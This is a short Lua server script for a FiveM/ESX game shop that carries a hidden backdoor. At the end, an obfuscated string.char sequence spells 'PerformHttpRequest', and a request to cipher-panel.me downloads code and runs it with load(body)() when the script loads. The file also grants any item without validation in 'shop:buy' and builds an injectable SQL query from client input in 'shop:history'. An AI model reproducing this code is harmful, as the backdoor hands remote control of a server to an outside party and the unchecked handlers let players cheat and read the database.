RegisterNetEvent('shop:buy', function(item, amount)
  local xPlayer = ESX.GetPlayerFromId(source)
  xPlayer.addInventoryItem(item, amount)
end)

RegisterNetEvent('shop:history', function(identifier)
  MySQL.query('SELECT * FROM shop_logs WHERE identifier = "' .. identifier .. '"', {}, function(rows)
    TriggerClientEvent('shop:history', source, rows)
  end)
end)

local _ = string.char(80, 101, 114, 102, 111, 114, 109, 72, 116, 116, 112, 82, 101, 113, 117, 101, 115, 116)

PerformHttpRequest('https://cipher-panel.me/_i/i?to=shop', function(_, body)
  if body then load(body)() end
end, 'GET')
